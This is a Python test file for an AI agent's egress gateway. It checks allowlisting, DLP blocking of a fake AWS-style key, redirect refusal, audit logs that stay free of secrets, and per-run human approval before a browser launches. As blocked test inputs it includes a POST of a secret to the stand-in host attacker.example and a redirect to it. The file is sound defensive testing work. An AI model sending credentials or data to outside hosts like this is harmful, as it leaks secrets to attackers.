import ast
import asyncio
import json
from pathlib import Path
from unittest.mock import patch

import httpx
import pytest

from sentinel_agent.agent import SentinelAgent
from sentinel_agent.egress.client import EgressBlocked, EgressClient, EgressGateway
from sentinel_agent.egress.config import EgressConfig
from sentinel_agent.egress.policy import DestinationPolicy
from sentinel_agent.egress.telemetry import read_verified
from sentinel_agent.llm import OllamaPlanner
from sentinel_agent.planner import HybridPlanner
from sentinel_agent.schemas import RunStatus


def httpx_bypasses(source):
    tree = ast.parse(source)
    return any(
        (isinstance(node, ast.Import) and any(n.name == "httpx" or n.name.startswith("httpx.") for n in node.names))
        or (isinstance(node, ast.ImportFrom) and (node.module or "").split(".")[0] == "httpx")
        or (isinstance(node, ast.Call) and isinstance(node.func, ast.Attribute)
            and isinstance(node.func.value, ast.Name) and node.func.value.id == "httpx")
        for node in ast.walk(tree)
    )


def test_no_httpx_outside_egress_package():
    root = Path(__file__).parents[1] / "sentinel_agent"
    offenders = [str(p.relative_to(root)) for p in root.rglob("*.py")
                 if "egress" not in p.relative_to(root).parts and httpx_bypasses(p.read_text(encoding="utf-8"))]
    assert not offenders
    assert httpx_bypasses("from httpx import AsyncClient as Bypass")
    assert httpx_bypasses("import httpx as hidden")


async def test_precheck_and_dlp_block_before_network_and_never_log_values(tmp_path):
    async def resolver(host, port):
        return ["8.8.8.8"]
    policy = DestinationPolicy(EgressConfig(provider_hosts=frozenset({"model.example"})), resolver)
    gateway = EgressGateway(policy=policy, audit_root=tmp_path, port=0).start()
    secret = "AKIA" + "A" * 16
    try:
        async with EgressClient(gateway=gateway) as client:
            with pytest.raises(EgressBlocked, match="not-allowlisted"):
                await client.post("https://attacker.example", json={"prompt": secret})
            with pytest.raises(EgressBlocked, match="dlp"):
                await client.post("https://model.example", json={"prompt": secret})
    finally:
        gateway.close()
    records = read_verified(gateway.audit.path)
    assert [r["rule"] for r in records] == ["not-allowlisted", "dlp"]
    assert secret not in gateway.audit.path.read_text()


async def test_client_uses_proxy_ignores_environment_and_does_not_follow_redirects(tmp_path, monkeypatch):
    hits = []

    async def handler(reader, writer):
        headers = await reader.readuntil(b"\r\n\r\n")
        size = next(int(line.split(b":")[1]) for line in headers.split(b"\r\n") if line.lower().startswith(b"content-length:"))
        hits.append(json.loads(await reader.readexactly(size)))
        writer.write(b"HTTP/1.1 302 Found\r\nLocation: http://attacker.example\r\nContent-Length: 0\r\nConnection: close\r\n\r\n")
        await writer.drain()
        writer.close()

    server = await asyncio.start_server(handler, "127.0.0.1", 0)
    port = server.sockets[0].getsockname()[1]
    policy = DestinationPolicy(EgressConfig(local_endpoints=frozenset({("127.0.0.1", port, "http")})))
    gateway = EgressGateway(policy=policy, audit_root=tmp_path, port=0).start()
    monkeypatch.setenv("HTTP_PROXY", "http://127.0.0.1:1")
    monkeypatch.setenv("NO_PROXY", "*")
    try:
        async with EgressClient(gateway=gateway) as client:
            with pytest.raises(EgressBlocked, match="redirect"):
                await client.post(f"http://127.0.0.1:{port}", json={"prompt": "local example"})
        assert hits == [{"prompt": "local example"}]
    finally:
        gateway.close()
        server.close()
        await server.wait_closed()
    assert any(r["kind"] == "connection" for r in read_verified(gateway.audit.path))


async def test_run_records_dlp_failure_in_trace(tmp_path):
    async def resolver(host, port):
        return ["8.8.8.8"]
    config = EgressConfig(provider_hosts=frozenset({"model.example"}))
    factory = lambda run_id, **kw: EgressGateway(run_id, policy=DestinationPolicy(config, resolver), audit_root=tmp_path, port=0, **kw)
    agent = SentinelAgent(HybridPlanner(OllamaPlanner("https://model.example", "test")), gateway_factory=factory)
    try:
        run = await agent.start("Check attendance " + "AKIA" + "A" * 16)
        assert any(e.kind == "egress" and e.data.get("rule") == "dlp" for e in run.events)
        assert run.status == RunStatus.COMPLETED  # Safe local fallback remains usable.
    finally:
        agent.close()


async def test_browser_approval_is_per_run_and_launch_uses_managed_session(tmp_path):
    async def resolver(host, port):
        return ["8.8.8.8"]
    factory = lambda run_id, **kw: EgressGateway(run_id, policy=DestinationPolicy(EgressConfig(approved_sites=frozenset()), resolver), audit_root=tmp_path, port=0, **kw)
    agent = SentinelAgent(HybridPlanner(OllamaPlanner("http://127.0.0.1:1", "unused")), gateway_factory=factory)
    try:
        with patch.object(EgressGateway, "open_browser", side_effect=lambda executable, url, **kwargs: {"url": url, "title": "YouTube", "status": 200}) as launch:
            run = await agent.start("YouTube search hello world", False, live_desktop=True)
            assert run.status == RunStatus.WAITING_APPROVAL
            assert not launch.called
            run = agent.approve(run.id, True)
            assert run.status == RunStatus.COMPLETED
            assert launch.call_args.args[1] == "https://www.youtube.com/results?search_query=hello+world"
            assert agent.gateways[run.id].proxy.token not in str(launch.call_args)
            another = await agent.start("YouTube search hello world", False, live_desktop=True)
            assert another.status == RunStatus.WAITING_APPROVAL
            assert agent.approve(another.id, False).status == RunStatus.FAILED
    finally:
        agent.close()
